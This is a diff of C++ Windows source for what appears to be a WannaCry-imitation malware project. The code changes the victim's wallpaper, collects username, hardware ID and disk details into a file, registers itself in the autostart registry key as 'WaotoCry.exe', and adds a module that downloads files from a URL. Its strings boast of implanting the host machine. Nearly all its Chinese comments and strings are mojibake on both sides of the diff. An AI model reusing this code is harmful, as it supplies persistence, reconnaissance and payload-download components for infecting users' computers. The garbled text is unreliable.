@@ -7,29 +7,29 @@ ifstream ifs;
 string wstring2string(wstring wstr)
 {
     string result;
-    //è·å–ç¼“å†²åŒºå¤§å°ï¼Œå¹¶ç”³è¯·ç©ºé—´ï¼Œç¼“å†²åŒºå¤§å°äº‹æŒ‰å­—èŠ‚è®¡ç®—çš„  
+    //»ñÈ¡»º³åÇø´óĞ¡£¬²¢ÉêÇë¿Õ¼ä£¬»º³åÇø´óĞ¡ÊÂ°´×Ö½Ú¼ÆËãµÄ  
     int len = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), NULL, 0, NULL, NULL);
     char* buffer = new char[len + 1];
-    //å®½å­—èŠ‚ç¼–ç è½¬æ¢æˆå¤šå­—èŠ‚ç¼–ç   
+    //¿í×Ö½Ú±àÂë×ª»»³É¶à×Ö½Ú±àÂë  
     WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), buffer, len, NULL, NULL);
     buffer[len] = '\0';
-    //åˆ é™¤ç¼“å†²åŒºå¹¶è¿”å›å€¼  
+    //É¾³ı»º³åÇø²¢·µ»ØÖµ  
     result.append(buffer);
     delete[] buffer;
     return result;
 }
 
 
-//æ›´æ”¹ç³»ç»Ÿæ¡Œé¢
+//¸ü¸ÄÏµÍ³×ÀÃæ
 void system_information_table() {
-    const char* path = "C:\\Users\\ASUS\\Pictures\\CG\\WannaCryå¤ç°.jpg";
+    const char* path = "C:\\Users\\ASUS\\Pictures\\CG\\WannaCry¸´ÏÖ.jpg";
     SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)path, SPIF_SENDCHANGE);
 }
 
 
 string text_box_auto() {
-    string email_text_book = "æˆåŠŸæ¤å…¥å®¿ä¸»æœº";
-    string email_text_neirong = "FTPå¯éšæ—¶å¼€å¯æœåŠ¡ï¼";
+    string email_text_book = "³É¹¦Ö²ÈëËŞÖ÷»ú";
+    string email_text_neirong = "FTP¿ÉËæÊ±¿ªÆô·şÎñ£¡";
     return email_text_book+email_text_neirong;
 }
 
@@ -44,23 +44,23 @@ string text_box_auto() {
 
 void fstream_double() {
 	ofs.open("C:\\Windows sys\\computer_box.txt", ios::out);
-	ofs << "è®¡ç®—æœºç”¨æˆ·åç§°:" <<windows_username<< endl;
-    ofs << "è®¾å¤‡HWID:" << HWID << endl;
-    ofs << "ç£ç›˜åç§°:" <<system_box <<endl;
-    ofs << "æ–‡ä»¶ç³»ç»Ÿï¼š" <<system_text<< endl;
+	ofs << "¼ÆËã»úÓÃ»§Ãû³Æ:" <<windows_username<< endl;
+    ofs << "Éè±¸HWID:" << HWID << endl;
+    ofs << "´ÅÅÌÃû³Æ:" <<system_box <<endl;
+    ofs << "ÎÄ¼şÏµÍ³£º" <<system_text<< endl;
 }
 
 
-//å¼€æœºè‡ªå¯åŠ¨
+//¿ª»ú×ÔÆô¶¯
 string userlc;
-//å¼€æœºè‡ªå¯åŠ¨
+//¿ª»ú×ÔÆô¶¯
 void AutoStart()
 {
     
     char Driver[MAX_PATH];
     HKEY hKey;
     string userlc = _pgmptr;
-    string exe_name = "E-mail_text_false.exe";
+    string exe_name = "WaotoCry.exe";
     string ff_path = userlc + exe_name;
     cout << ff_path << endl;
     strcpy(Driver, ff_path.c_str());
@@ -91,7 +91,7 @@ void ifsteam_open_read() {
     ifs.open("C:\\Windows sys\\computer_box.txt", ios::in);
     if (!ifs.is_open())
     {
-        cout << "æ–‡ä»¶æ‰“å¼€å¤±è´¥" << endl;
+        cout << "ÎÄ¼ş´ò¿ªÊ§°Ü" << endl;
         return;
     }
     char c;
@@ -102,7 +102,7 @@ void ifsteam_open_read() {
     ifs.close();
 }
 
-//GetVolumelnformationå…¨å±€å‚æ•°
+//GetVolumelnformationÈ«¾Ö²ÎÊı
 
 
 
@@ -114,13 +114,13 @@ void c_box_information() {
     DWORD dwfilesystemflgs = 0;
     TCHAR szfilesystemname[260] = { 0 };
     GetVolumeInformation(_T("C:\\"), szvolumename, 260, &dwvolumeserialnumber, &dwmaxvolumename, &dwfilesystemflgs, szfilesystemname, 260);
-    //printf("å·æ ‡åç§°ï¼š%s\nå·æ ‡åºåˆ—å·ï¼š%x\næ–‡ä»¶åç§°æœ€å¤§é•¿åº¦ï¼š%d\næ–‡ä»¶ç³»ç»Ÿæ ‡è¯†ï¼š%x\næ–‡ä»¶ç³»ç»Ÿåç§°:%s",
+    //printf("¾í±êÃû³Æ£º%s\n¾í±êĞòÁĞºÅ£º%x\nÎÄ¼şÃû³Æ×î´ó³¤¶È£º%d\nÎÄ¼şÏµÍ³±êÊ¶£º%x\nÎÄ¼şÏµÍ³Ãû³Æ:%s",
     //    szvolumename, dwvolumeserialnumber, dwmaxvolumename, dwfilesystemflgs, szfilesystemname);
-    cout << "å·æ ‡åç§°ï¼š"<< szvolumename <<endl;
-    cout << "å·æ ‡åºåˆ—å·ï¼š" << dwvolumeserialnumber << endl;
-    cout << "æ–‡ä»¶åç§°æœ€å¤§é•¿åº¦ï¼š" << dwmaxvolumename << endl;
-    cout << "æ–‡ä»¶ç³»ç»Ÿæ ‡è¯†ï¼š" << dwfilesystemflgs << endl;
-    cout << "æ–‡ä»¶ç³»ç»Ÿåç§°" << szfilesystemname << endl;
+    cout << "¾í±êÃû³Æ£º"<< szvolumename <<endl;
+    cout << "¾í±êĞòÁĞºÅ£º" << dwvolumeserialnumber << endl;
+    cout << "ÎÄ¼şÃû³Æ×î´ó³¤¶È£º" << dwmaxvolumename << endl;
+    cout << "ÎÄ¼şÏµÍ³±êÊ¶£º" << dwfilesystemflgs << endl;
+    cout << "ÎÄ¼şÏµÍ³Ãû³Æ" << szfilesystemname << endl;
 
    /* TCHAR VolumeNameBuffer[MAX_PATH + 1], FileSystemNameBuffer[MAX_PATH];
     DWORD VolumeSerialNumber, MaximumComponentLength, FileSystemFlags;
@@ -168,3 +168,33 @@ string system_information_text() {
     return szFileSystemBuf;
 }
 
+/*struct GPU_information
+{
+    string 
+}*/; 
+
+
+
+
+//ÏÂÔØÄ£¿é
+void download(string usl) {
+    string download_usl = usl;
+    size_t len = download_usl.length();//»ñÈ¡×Ö·û´®³¤¶È
+    int nmlen = MultiByteToWideChar(CP_ACP, 0, download_usl.c_str(), len + 1, NULL, 0);
+    wchar_t* buffer = new wchar_t[nmlen];
+    MultiByteToWideChar(CP_ACP, 0, download_usl.c_str(), len + 1, buffer, nmlen);
+    HRESULT hr = URLDownloadToFile(NULL, buffer, _T("F:\\$windows_sys\\»ÒÔ­°§.jpg"), 0, NULL);
+    if (hr == S_OK)
+    {
+        setcolor(2);
+        cout << "ÎÄ¼şÏÂÔØ³É¹¦£¡" << endl;
+        setcolor(15);
+    }
+    else
+    {
+        setcolor(12);
+        cout << "ÎÄ¼şÏÂÔØÊ§°Ü£¡" << endl;
+        setcolor(15);
+    }
+   
+}
